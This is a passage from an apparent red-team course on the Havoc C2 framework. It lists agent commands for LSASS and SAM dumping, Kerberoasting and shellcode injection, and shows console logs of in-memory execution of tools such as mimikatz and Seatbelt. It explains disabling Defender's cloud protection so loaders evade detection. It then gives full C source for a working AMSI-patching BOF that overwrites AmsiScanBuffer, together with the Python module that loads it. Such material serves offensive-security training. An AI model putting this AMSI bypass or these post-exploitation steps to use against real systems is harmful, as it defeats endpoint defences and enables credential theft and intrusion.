kerberoast Command perform Kerberoasting against specified SPN

klist Command list Kerberos tickets

ldapsearch Command Execute LDAP searches (NOTE: specify *,ntsecuritydescriptor as attribute parameter if you want all attributes + base64 encoded ACL of the objects, this can then be resolved using BOFHound. Could possibly break pagination, although everything seemed fine during testing.)

listdns Command lists dns cache entries

locale Command Prints locale information

luid Command get current logon ID

mkdir Command create new directory

mv Command move file from one location to another

nanodump Command Dump the LSASS process

nanodump_ppl_dump Command Bypass PPL and dump LSASS

nanodump_ppl_medic Command Bypass PPL and dump LSASS

nanodump_ssp Command Load a Security Support Provider (SSP) into LSASS

net Module network and host enumeration module

netGroupList Command List groups from the default or specified domain

netGroupListMembers Command List group members from the default or specified domain

netLclGrpLstMmbrs Command List local group members from the local or specified group

netLocalGroupList Command List local groups from the local or specified computer

netshares Command List shares on local or remote computer

netsharesAdmin Command List shares on local or remote computer and gets more info then standard netshares (requires admin)

netstat Command List listening and connected ipv4 udp and tcp connections

netuptime Command Returns information about the boot time on the local (or a remote) machine

netuser Command Get info about specific user. Pull from domain if a domainname is specified

netview Command lists local workstations and servers

noconsolation Command Execute a PE inline

nslookup Command Make a DNS query. DNS server is the server you want to query (do not specify or 0 for default). Record type is something like A, AAAA, or ANY

pivot Module pivoting module

powerpick Command executes unmanaged powershell commands

powershell Command executes powershell.exe commands and gets the output

proc Module process enumeration and management

ptt Command import Kerberos ticket into a logon session

purge Command purge a Kerberos ticket

pwd Command get current directory

quser Command Simple implementation of quser.exe usingt the Windows API

reg_delete Command Deletes the registry key or value

reg_query Command Query a registry value or enumerate a single key

reg_query_recursive Command Recursively enumerate a key starting at path

reg_save Command Saves the registry path and all subkeys to disk

reg_set Command This command creates or sets the specified registry key (or value) on the target host.

remove Command remove file or directory

resources Command list available memory and space on the primary disk drive

routeprint Command prints ipv4 routes on the machine

rportfwd Module reverse port forwarding

samdump Command Dump the SAM, SECURITY and SYSTEM registries

sc_create Command This command creates a service on the target host.

sc_delete Command This command deletes the specified service on the target host.

sc_description Command This command sets the description of an existing service on the target host.

sc_enum Command Enumerate services for qc, query, qfailure, and qtriggers info

sc_qc Command sc qc impelmentation in BOF

sc_qdescription Command Queries a services description

sc_qfailure Command Query a service for failure conditions

sc_qtriggerinfo Command Query a service for trigger conditions

sc_query Command sc query implementation in BOF

sc_start Command This command starts the specified service on the target host.

sc_stop Command This command stops the specified service on the target host.

schtasksenum Command Enumerate scheduled tasks on the local or remote computer

schtasksquery Command Query the given task on the local or remote computer

screenshot Command takes a screenshot

sessions Command get logon sessions

setuserpass Command Sets the password for the specified user account on the target computer.

shell Command executes cmd.exe commands and gets the output

shellcode Module shellcode injection techniques

sleep Command sets the delay to sleep

socks Module socks5 proxy

task Module task manager

tasklist Command This command displays a list of currently running processes on either a local or remote machine.

tgtdeleg Command retrieve a usable TGT for the current user

token Module token manipulation and impersonation

transfer Command download transfer module

upload Command uploads a specified file

uptime Command lists system boot time

userenum Command Lists user accounts on the current computer

whoami Command get the info from whoami /all without starting cmd.exe

windowlist Command list windows visible on the users desktop

wmi_query Command Run a wmi query and display results in CSV format
```

As you can see, a handful of commands can be used. Please note that many of those commands have their own limitations that we will have to get around by ourselves. With this being said, let's over the most notable commands.

* `shell` --> Allows to execute commands using cmd.exe. Bear in mind though, that this approach involves spawning a new cmd.exe process which reduces our level of stealth.

```
24/01/2024 07:47:49 [Neo] Demon » shell whoami

[*] [582B14EA] Tasked demon to execute a shell command
[+] Send Task to Agent [112 bytes]
[+] Received Output [26 bytes]

standalone01\administrator
```

* `userenum` --> Allows to quickly get a list of local users on the computer. It's benefial to do it this way, as opposed to for example, executing `net users`. Reason being is simple, we spawn less processes. Executing `net users` will spawn a new `net.exe` process which is usually a sign of intrusion to defenders. But the `userenum` approach, instead, executes a BOF which in turn is a way stealthier manner of gathering information. We will go over BOF's more in depth later on this course.

```
24/01/2024 07:47:26 [Neo] Demon » userenum

[*] [76AF304E] Tasked demon to list user accounts on the current computer
[+] Send Task to Agent [31 bytes]
[+] Received Output [76 bytes]:

-- Administrator
-- bayden
-- DefaultAccount
-- Guest
-- WDAGUtilityAccount

[*] BOF execution completed
```

* `shellcode` --> Allows the injection of shellcode into a specific process PID. Could be useful to spawn another beacon for example. The approach is not recommended to be used as modern AV's and EDR protection solutions will pick it up instantly.

```
24/01/2024 07:53:08 [Neo] Demon » shellcode spawn x64 /home/kali/SquidGuard/beacon.bin

[*] [AC31F29D] Tasked demon to fork and inject a x64 shellcode
[+] Send Task to Agent [97311 bytes]
[+] Successful injected shellcode
```

* `upload` --> Allows uploading local files to a machine. 

```
24/01/2024 07:58:29 [Neo] Demon » upload /home/kali/SquidGuard/beacon.bin C:\users\administrator\beacon.bin

[*] [30A9F2D6] Tasked demon to upload a file /home/kali/SquidGuard/beacon.bin to C:\users\administrator\beacon.bin

[*] Uploaded file: C:\users\administrator\beacon.bin (97279)
```

* `download` -->Allows downloading files from the machine to our local machine.

```
24/01/2024 08:01:03 [Neo] Demon » download C:\users\administrator\webloader.exe

[*] [A0B3CF4D] Tasked demon to download a file C:\users\administrator\webloader.exe
[*] Started download of file: C:\users\administrator\webloader.exe [2.37 MB]
[+] Finished download of file: C:\users\administrator\webloader.exe
```

* `powsershell.exe` --> Allows execution of commands using powershell. Bear in mind though, that will create a new powershell process on the system which is usually associated with threats. 

```
24/01/2024 08:01:32 [Neo] Demon » powershell whoami

[*] [FE826795] Tasked demon to execute a powershell command/script
[+] Send Task to Agent [172 bytes]
[+] Received Output [28 bytes]:
standalone01\administrator
```

* `screenshot` --> Allows capturing the user's screen(only if a desktop exists, which is usually the case when a user is logged on).

```
24/01/2024 08:07:11 [Neo] Demon » screenshot

[*] [D2EC45F8] Tasked demon to take a screenshot
[+] Send Task to Agent [12 bytes]
[+] Successful took screenshot
```

Screenshots can then be found over here :

![](/assets/imgs/havoc-c2/Pasted image 20240219142251.png)

* `poowerpick` --> Allows execution of powershell commands without spawning actual powershell processes. This works by utilizing specifically crafted dll's that mimic powershell's functionality. 

```
24/01/2024 08:08:41 [Neo] Demon » powerpick whoami

[*] [1098765E] Tasked demon to execute unmanaged powershell commands
[+] Send Task to Agent [27144 bytes]
[+] Successful spawned reflective dll
[+] Received Output [28 bytes]:

standalone01\administrator
```

`noconsolation` --> Allows the execution of PE's in memory instead of having to place them on disk. In the example below, powershell.exe was executed on the system.

```
24/01/2024 08:16:30 [Neo] Demon » noconsolation --local C:\windows\system32\windowspowershell\v1.0\powershell.exe $ExecutionContext.SessionState.LanguageMode

[*] [BF329D78] Tasked demon to run powershell.exe inline
[+] Send Task to Agent [31 bytes]
[+] Received Output [14 bytes]:
FullLanguage


[+] Received Output [4 bytes]:

done

[*] BOF execution completed
```

Binaries are automatically encrypted and stored in memory after they are ran the first time. This means that you do not need to constantly send the binary over the wire and you could instead do something like this the next time :

```
29/08/2024 20:45:19 [ori] Demon » noconsolation powershell.exe $ExecutionContext.SessionState.LanguageMode
[*] [02D5F14B] Tasked demon to run powershell.exe inline
[+] Send Task to Agent [31 bytes]
[+] Received Output [14 bytes]:
FullLanguage

[+] Received Output [4 bytes]:
done
[*] BOF execution completed
```

This module also supports running executables that are not already on the Windows system. For example, we could run `mimikatz` :

```
24/01/2024 08:19:59 [Neo] Demon » noconsolation /home/kali/SquidGuard/mimikatz.exe "coffee" "exit"

[*] [2690B5DF] Tasked demon to run mimikatz.exe inline
[+] Send Task to Agent [31 bytes]
[+] Received Output [4 bytes]:

done

[*] BOF execution completed
```

It seems like we did not get any output back. Actually, we did. Just not in the place you might expect :

![](/assets/imgs/havoc-c2/Pasted image 20240219143746.png)

It appears that our commands output appears in the output of our loader's execution. At this point in time, this isn't a problem as we have a way to see the output. However, consider a scenario in which we were able to obtain a shell and no access to the user's desktop. In that case, we won't be able to see any output and thereby, the command's execution proves to be useless. We will go over yet another way of executing PE's inline later on this module.

* `dotnet` --> Allows the execution of C# code in memory. Similar to PE's, C# binaries can also be run in memory to avoid having them touch the actual disk. Let's take a look at an example where `Seatbelt.exe` is being executed.

```
24/01/2024 08:30:15 [Neo] Demon » dotnet inline-execute /home/kali/VulnLabs/Seatbelt.exe scheduledtasks

[*] [F4A62E80] Tasked demon to inline execute a dotnet assembly: /home/kali/VulnLabs/Seatbelt.exe

[+] Send Task to Agent [208 bytes]
[*] Using CLR Version: v4.0.30319
[+] Received Output [72206 bytes]:


%&&@@@&&

&&&&&&&%%%, #&&@@@@@@%%%%%%###############%

&%& %&%% &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%

%%%%%%%%%%%######%%%#%%####% &%%**# @////(((&%%%%%%######################(((((((((((((((((((

#%#%%%%%%%#######%#%%####### %&%,,,,,,,,,,,,,,,, @////(((&%%%%%#%#####################(((((((((((((((((((

#%#%%%%%%#####%%#%#%%####### %%%,,,,,, ,,. ,, @////(((&%%%%%%%######################(#(((#(#((((((((((

#####%%%#################### &%%...... ... .. @////(((&%%%%%%%###############%######((#(#(####((((((((

#######%##########%######### %%%...... ... .. @////(((&%%%%%#########################(#(#######((#####

###%##%%#################### &%%............... @////(((&%%%%%%%%##############%#######(#########((#####

#####%###################### %%%.. @////(((&%%%%%%%################

&%& %%%%% Seatbelt %////(((&%%%%%%%%#############*

&%%&&&%%%%% v1.2.1 ,(((&%%%%%%%%%%%%%%%%%,

#%%%%##,

  

  

====== ScheduledTasks ======

Non Microsoft scheduled tasks (via WMI)

Name : User_Feed_Synchronization-{49654196-7258-4E64-A1B1-717ADEE3AD8D}
Principal :
GroupId :
Id : Author
LogonType : Network
RunLevel : TASK_RUNLEVEL_LUA
UserId : Administrator
Author : WIN-CIAO1NTPQVI\Administrator
Description : Updates out-of-date system feeds.
Source :
State : Ready
SDDL :
Enabled : True
Date : 1/1/0001 12:00:00 AM
AllowDemandStart : True
DisallowStartIfOnBatteries : False
ExecutionTimeLimit : PT72H
StopIfGoingOnBatteries : False
Actions :

------------------------------

Type : MSFT_TaskAction
Arguments : sync
Execute : C:\Windows\system32\msfeedssync.exe
------------------------------

Triggers :
------------------------------

Type : MSFT_TaskDailyTrigger
Enabled : True
StartBoundary : 2024-02-19T17:40:01-08:00
EndBoundary : 2034-02-19T17:40:01-08:00
StopAtDurationEnd : False
DaysInterval : 1

------------------------------

[SNIP]

[*] Completed collection in 0.294 seconds
```

Generally, the `noconsolation` and `dotnet inline-execute` modules don't work right out of the box. This is due to the sophisticated protections that are now in place in organizations. Both modules utilize memory to execute their respective codes and thus, an interesting protection component called `AMSI` is our main enemy. `AMSI` is the protection method responsible for pin-pointing malicious executions of code in memory. The next section in this module will cover how `noconsolation` and `dotnet inline-execute` can be used despite AMSI's presence.

# Defeating AMSI

Like we mentioned previously, AMSI is the main component that will prevent us from successfully executing code in memory. For this example, we will be using a fresh Windows 11 VM on which Windows Defender has been enabled with the following options :

![](/assets/imgs/havoc-c2/Pasted image 20240219145457.png)

The automatic file sample submission has been turned off to avoid sharing our malicious loaders with Microsoft. Otherwise, signatures will be added into Windows Defender and thus, making our payloads detectable. Another option we decided to turn off, is the `Cloud-delivered protection`. In order to provide the best protection for the user, Microsoft will not only rely on data within Windows Defender, but will also fetch protections from the Cloud. If this option is enabled, our loader is immediately detected. Sure, we could write a better loader to avoid getting detected even with the Cloud protection option ON, however, as this is not the main objective of the course, we have decided to turn this off for the next few examples.

On the fresh Windows 11 VM, transfer your executable to it. This can once again be done using `scp` or any of your preferred transferring methods. Do make sure to have the python HTTP webserver running before executing the loader. Once the exe is transferred and executed, let's go back to Havoc and move ahead with our exploitation.

If we attempt to execute our previous command that was meant to execute `Seatbelt.exe` in memory, we will now face a different output.

![](/assets/imgs/havoc-c2/Pasted image 20240219150901.png)

As you can see, a failure now occurs. If we take a look at the `Protection History` in Windows Defender, we will see that indeed our attempt at executing C# code in memory was blocked.

![](/assets/imgs/havoc-c2/Pasted image 20240219151002.png)

As a result of this, our Havoc session was terminated. Let's re-obtain the session in Havoc and think about ways we could employ to avoid detection.

# Understanding AMSI

If we want to bypass AMSI, we must first start by understanding how exactly it works. Amsi stands for "**Anti-malware Scan Interface**". It's main objective is objective is hunt down malicious attempts of loading code into memory. Here's a visual illustration of AMSI under the hood.

![](/assets/imgs/havoc-c2/Pasted image 20240219154853.png)

`amsi.dll` is loaded into any new processes to hook any input in the PowerShell command line or to analyze content for `[System.Reflection.Assembly]::Load()` calls. `amsi.dll` includes multiple functions that are used for analysis of data : **AmsiInitialize**, **AmsiOpenSession,** **AmsiScanbuffer**, etc. When we are talking about bypassing AMSI, we mean that we intend to crash any of the functions mentioned above. If a successful crash can be achieved, AMSI will not be able to function properly. Take **AmsiScanBuffer** for example, if any command or code is executed within the process, this function takes the input data and holds it in a specifically allocated buffer in memory. Next, the AntiVirus solution that is used in the environment will connect to this buffer and scan its contents. If a virus/trojan/malware is identified, execution of the concerned code is not allowed and an alert is generated. However, if a successful "patch" is applied on the **AmsiScanBuffer** function, we might be able to prevent it from placing any new data in its buffer. So, upon execution of our code, no data will be put in the buffer thereby, when the Antivirus solution is called to scan the buffer, nothing is scanned and our code is allowed to execute!

While debugging and understanding `amsi.dll` more in depth is important, it will not be covered in this course. Reason being, it was covered many times already online. If you're interested in knowing how to debug/understand AMSI on a deeper level, please consult the following website.

https://gustavshen.medium.com/bypass-amsi-on-windows-11-75d231b2cac6
# Developing custom Havoc C2 modules

A neat feature that we haven't yet discussed in the course is `Modules`. That's right! Havoc supports custom modules! We can create those modules ourselves and make them do specific actions that we desire. In our case, we know that AMSI is preventing us from utilizing C# code in memory, so, we'll create a module that will patch AMSI in our current process. As a result of the patching, we will be able to run the desired C# code. Let's take a look at a basic structure of a Havoc module.

All available modules can be found in `Havoc/client/Modules`. We will take a look at an example module that already comes pre-installed with Havoc : `DomainInfo`. When we browse to its directory (`Havoc/client/Modules/Domaininfo`), we see 2 files.

```
➜  Domaininfo git:(main) ✗ ls
Domaininfo.o  Domaininfo.py
➜  Domaininfo git:(main) ✗ 
```

The `Domaininfo.o` file is a COFF object file or can also be called a BOF. This is a compiled binary filled with instructions and Windows API's meant to execute certain actions on a system. Remember we spoke about how it's more beneficial to use the `userenum` module instead of using `shell net users`? Well, here's why! `shell` will spawn additional processes leading to potential detection. However, running BOF's will not! These run directly in memory and don't make as much noise on a system. In the case of the `Domaininfo` module, we have a BOF which is the `Domaininfo.o` binary.

```
➜  Domaininfo git:(main) ✗ file Domaininfo.o 
Domaininfo.o: Intel amd64 COFF object file, no line number info, not stripped, 7 sections, symbol offset=0x16ee, 34 symbols, 1st section name ".text"
➜  Domaininfo git:(main) ✗ 
```

Let's now take a look at the actual module file :

```
➜  Domaininfo git:(main) ✗ cat Domaininfo.py 
from havoc import Demon, RegisterCommand
from struct import pack, calcsize

def dcenum(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None

    demon  = Demon( demonID )

    if demon.ProcessArch == "x86":
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to enumerate domain information using Active Directory Domain Services" )
    
    demon.InlineExecute( TaskID, "go", "Domaininfo.o", b'', False )

    return TaskID

RegisterCommand( dcenum, "", "dcenum", "enumerate domain information using Active Directory Domain Services", 0, "", "" )
```

The most notable line, is the one where we register the command within Havoc :

```
RegisterCommand( dcenum, "", "dcenum", "enumerate domain information using Active Directory Domain Services", 0, "", "" )
```

`dcenum` represents the name of the command and `enumerate domain information using Active Directory Domain Services` represents the description that will shown for the command's help menu. 

When this module will be executed, the first check that is being made is :

```
 if demon.ProcessArch == "x86":
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False
```

A verification is being done to make sure that our beacon is not running an x86 architecture. If so, an error is raised.

From there, we proceed by showing some output in the Havoc Console to alert to the user on what is happening :

```
TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to enumerate domain information using Active Directory Domain Services" )
```

And finally, we indicate to Havoc what BOF will need to be executed if all checks have been passed :

```
demon.InlineExecute( TaskID, "go", "Domaininfo.o", b'', False )
```

- The `TaskID` parameter is self-explanatory.
- The second parameter, `go` represents the entry point in our BOF. This is the function from which execution will begin. 
- The third parameter, `DomainInfo.o` represents the BOF to be run.
- The fourth and fifth parameters are not important to us.

## Creating our own Havoc Module

Now that we went over a basic structure of a Havoc Module, let's write our own. We'll first navigate to `Havoc/client/Modules` and create a directory. We'll call it `amsipatch`. Afterwards, switch to the directory.

`amsipatch.py`

```
from havoc import Demon, RegisterCommand
from struct import pack, calcsize

class Packer:
    def __init__(self):
        self.buffer : bytes = b''
        self.size   : int   = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)
def amsipatch(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )


    if demon.ProcessArch == "x86":
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked beacon to patch AMSIScanBuffer()" )

    Task = Packer()

    demon.InlineExecute( TaskID, "go", f"amsipatch.o",b'', False)
    return TaskID

RegisterCommand( amsipatch , "", "amsipatch", "in process AMSI patch", 0, "", '')
```

We start by implementing a `Packer` class along with a few methods that will be used to properly pack the BOF for execution on the Windows System. 

```
class Packer:
    def __init__(self):
        self.buffer : bytes = b''
        self.size   : int   = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)
```

We perform the same check as in the other module, making sure that we are not in an x86 process.

```
if demon.ProcessArch == "x86":
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return
```

We provide the user with a debug message in the console.

```
TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked beacon to patch AMSIScanBuffer()" )
```

Initiate the Packer.

```
Task = Packer()
```

Provide information to Havoc on what to do to execute the module. In this case, the concerned BOF is located in the `amsipatch.o` file and its entry point is at the `go` function.

```
demon.InlineExecute( TaskID, "go", f"amsipatch.o",b'', False)
```

### Creating the AMSI Patching BOF

With this out of the way, it's now time to go ahead and create our BOF. BOF creation can be rather hard if it's the first time you're encountering one. However, after a bit of trial and error, you'll be way on your way to creating your own BOF's in the future.

Let's take a look at the source of our BOF.

`amsipatch.c`

```
#include <windows.h>
#include <io.h>
#include <stdio.h>
#include <fcntl.h>
#include <evntprov.h>
#include "beacon.h"
#include "inlineExecute-Assembly.h"

/*Patch AMSI*/
BOOL patchAMSI()
{
	
#ifdef _M_AMD64
    unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };//x64
#elif defined(_M_IX86)
	unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };//x86
#endif

	HINSTANCE hinst = LoadLibrary("amsi.dll");
    void* pAddress = (PVOID)GetProcAddress(hinst, "AmsiScanBuffer");
	if(pAddress == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR , "AmsiScanBuffer failed\n");
		return 0;
	}
	
	void* lpBaseAddress = pAddress;
	ULONG OldProtection, NewProtection;
	SIZE_T uSize = sizeof(amsiPatch);
	
	//Change memory protection via NTProtectVirtualMemory
	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
	NTSTATUS status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_ERROR , "[-] NtProtectVirtualMemory failed %d\n", status);
		return 0;
	}

	//Patch AMSI via NTWriteVirtualMemory
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	status = NtWriteVirtualMemory(NtCurrentProcess(), pAddress, (PVOID)amsiPatch, sizeof(amsiPatch), NULL);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_ERROR , "[-] NtWriteVirtualMemory failed\n");
		return 0;
	}

	//Revert back memory protection via NTProtectVirtualMemory
	status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_ERROR , "[-] NtProtectVirtualMemory2 failed\n");
		return 0;
	}
	
	//Successfully patched AMSI
	return 1;	
}

/*BOF Entry Point*/
void go(char* args, int length) {
//Patch amsi
BOOL success = 1;
success = patchAMSI();

//If patching AMSI fails exit gracefully
if (success != 1) {
	BeaconPrintf(CALLBACK_ERROR, "Patching AMSI failed.");
	return;

} else {
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Amsi successfully patched!");
    }
}
```

This might appear overwhelming at first glance but we'll through each individual part together.

- We start off with a few imports.

```
#include <windows.h>
#include <io.h>
#include <stdio.h>
#include <fcntl.h>
#include <evntprov.h>
#include "beacon.h"
#include "inlineExecute-Assembly.h"
```

Out of those imports, 2 are not standard! 

```
#include "beacon.h"
#include "inlineExecute-Assembly.h"
```

We will need to include them in our current working directory when compiling the BOF.

The next piece of code initiates a function and calls it `patchAMSI`. This function is the core of our AMSI bypass. Further comments were added to understand what is happening at each line.

```
/*Patch AMSI*/
BOOL patchAMSI()
{
        
#ifdef _M_AMD64
    unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };//x64
#elif defined(_M_IX86)
        unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };//x86
#endif

        HINSTANCE hinst = LoadLibrary("amsi.dll");
    void* pAddress = (PVOID)GetProcAddress(hinst, "AmsiScanBuffer");
        if(pAddress == NULL)
        {
                BeaconPrintf(CALLBACK_ERROR , "AmsiScanBuffer failed\n");
                return 0;
        }
        
        void* lpBaseAddress = pAddress;
        ULONG OldProtection, NewProtection;
        SIZE_T uSize = sizeof(amsiPatch);
        
        //Change memory protection via NTProtectVirtualMemory
        _NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
        NTSTATUS status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
        if (status != STATUS_SUCCESS) {
                BeaconPrintf(CALLBACK_ERROR , "[-] NtProtectVirtualMemory failed %d\n", status);
                return 0;
        }

        //Patch AMSI via NTWriteVirtualMemory
        _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
        status = NtWriteVirtualMemory(NtCurrentProcess(), pAddress, (PVOID)amsiPatch, sizeof(amsiPatch), NULL);
        if (status != STATUS_SUCCESS) {
=               BeaconPrintf(CALLBACK_ERROR , "[-] NtWriteVirtualMemory failed\n");
                return 0;
        }

        //Revert back memory protection via NTProtectVirtualMemory
        status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);
        if (status != STATUS_SUCCESS) {
                BeaconPrintf(CALLBACK_ERROR , "[-] NtProtectVirtualMemory2 failed\n");
                return 0;
        }
        
        //Successfully patched AMSI
        return 1;       
}
```

In sum, when called, this function will attempt to get a handle on `amsi.dll` which is the DLL that is being loaded into each process. This DLL holds the main functionality of AMSI. After getting a handle to `amsi.dll`, the function will attempt to "patch" the memory address where `AmsiScanBuffer` resides. Like mentioned before, `AmsiScanBuffer` is the buffer in which data is stored for defensive solutions to scan. If this buffer isn't available or isn't functioning properly, a bypass can be achieved.

If the AMSI patch is successful, 1 is returned.

```
//Successfully patched AMSI
        return 1;
```

Remember how we mentioned the `go` function as the entry point of BOF's? Well, here it is.

```
/*BOF Entry Point*/
void go(char* args, int length) {
```

We then proceed by defining the success condition and calling the previously declared `patchAMSI` function.

```
//Patch amsi
BOOL success = 1;
success = patchAMSI();
```

We then detect if the patch worked or not.

```
//If patching AMSI fails exit gracefully
if (success != 1) {
        BeaconPrintf(CALLBACK_ERROR, "Patching AMSI failed.");
        return;

} else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Amsi successfully patched!");
    }
}
```

You might have noticed the `BeaconPrintf` function that we've been using without ever declaring. This function, along many others, is part of the API's that our BOF can use.

A full list of available API's can be found here : https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_bof-c-api.htm

These API's have been implemented within Havoc to facilitate our development. For example, the `BeaconPrintf` function allows sending output back to our Havoc console. This can be useful to send out success/failure messages along with related data that might help us debug the issue if a failure is encountered.

### The compilation of the BOF

With the BOF now saved in `amsipatch.c`, we need to have all required libraries in the same directory as well. This includes :

`beacon.h`

```
/*

 * Beacon Object Files (BOF)

 * -------------------------

 * A Beacon Object File is a light-weight post exploitation tool that runs

 * with Beacon's inline-execute command.

 *

 * Cobalt Strike 4.1.

 */



#pragma once



 /* data API */

typedef struct {

	char* original; /* the original buffer [so we can free it] */

	char* buffer;   /* current pointer into our buffer */

	int    length;   /* remaining length of data */

	int    size;     /* total size of this buffer */

} datap;



DECLSPEC_IMPORT void    BeaconDataParse(datap* parser, char* buffer, int size);

DECLSPEC_IMPORT int     BeaconDataInt(datap* parser);

DECLSPEC_IMPORT short   BeaconDataShort(datap* parser);

DECLSPEC_IMPORT int     BeaconDataLength(datap* parser);

DECLSPEC_IMPORT char* BeaconDataExtract(datap* parser, int* size);



/* format API */

typedef struct {

	char* original; /* the original buffer [so we can free it] */

	char* buffer;   /* current pointer into our buffer */

	int    length;   /* remaining length of data */

	int    size;     /* total size of this buffer */

} formatp;



DECLSPEC_IMPORT void    BeaconFormatAlloc(formatp* format, int maxsz);

DECLSPEC_IMPORT void    BeaconFormatReset(formatp* format);

DECLSPEC_IMPORT void    BeaconFormatFree(formatp* format);

DECLSPEC_IMPORT void    BeaconFormatAppend(formatp* format, char* text, int len);

DECLSPEC_IMPORT void    BeaconFormatPrintf(formatp* format, char* fmt, ...);

DECLSPEC_IMPORT char* BeaconFormatToString(formatp* format, int* size);

DECLSPEC_IMPORT void    BeaconFormatInt(formatp* format, int value);



/* Output Functions */

#define CALLBACK_OUTPUT      0x0

#define CALLBACK_OUTPUT_OEM  0x1e

#define CALLBACK_ERROR       0x0d

#define CALLBACK_OUTPUT_UTF8 0x20



DECLSPEC_IMPORT void   BeaconPrintf(int type, char* fmt, ...);

DECLSPEC_IMPORT void   BeaconOutput(int type, char* data, int len);



/* Token Functions */

DECLSPEC_IMPORT BOOL   BeaconUseToken(HANDLE token);

DECLSPEC_IMPORT void   BeaconRevertToken(VOID);

DECLSPEC_IMPORT BOOL   BeaconIsAdmin(VOID);



/* Spawn+Inject Functions */

DECLSPEC_IMPORT void   BeaconGetSpawnTo(BOOL x86, char* buffer, int length);

DECLSPEC_IMPORT void   BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len);

DECLSPEC_IMPORT void   BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len);

DECLSPEC_IMPORT void   BeaconCleanupProcess(PROCESS_INFORMATION* pInfo);



/* Utility Functions */

DECLSPEC_IMPORT BOOL   toWideChar(char* src, wchar_t* dst, int max);


```

As well as :

`inlineExecute-Assembly.h`

```
#pragma once

#include <windows.h>



/*BOF Defs*/

#define intAlloc(size) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size)



//MSVCRT

WINBASEAPI void* WINAPI MSVCRT$malloc(SIZE_T);

WINBASEAPI void* __cdecl MSVCRT$memcpy(void* __restrict _Dst, const void* __restrict _Src, size_t _MaxCount);

WINBASEAPI void __cdecl MSVCRT$memset(void* dest, int c, size_t count);

WINBASEAPI int __cdecl MSVCRT$strcmp(const char* _Str1, const char* _Str2);

WINBASEAPI SIZE_T WINAPI MSVCRT$strlen(const char* str);

WINBASEAPI int __cdecl MSVCRT$_snprintf(char* s, size_t n, const char* fmt, ...);

WINBASEAPI errno_t __cdecl MSVCRT$mbstowcs_s(size_t* pReturnValue, wchar_t* wcstr, size_t sizeInWords, const char* mbstr, size_t count);

WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t *_Str);

WINBASEAPI char* WINAPI MSVCRT$_strlwr(char * str);

WINBASEAPI char* WINAPI MSVCRT$strrchr(char * str);

WINBASEAPI int __cdecl MSVCRT$_open_osfhandle (intptr_t osfhandle, int flags);

WINBASEAPI int __cdecl MSVCRT$_dup2( int fd1, int fd2 );

WINBASEAPI int __cdecl MSVCRT$_close(int fd);

//KERNEL32

WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();

WINBASEAPI void * WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);

WINBASEAPI int WINAPI KERNEL32$lstrlenA(LPCSTR lpString);

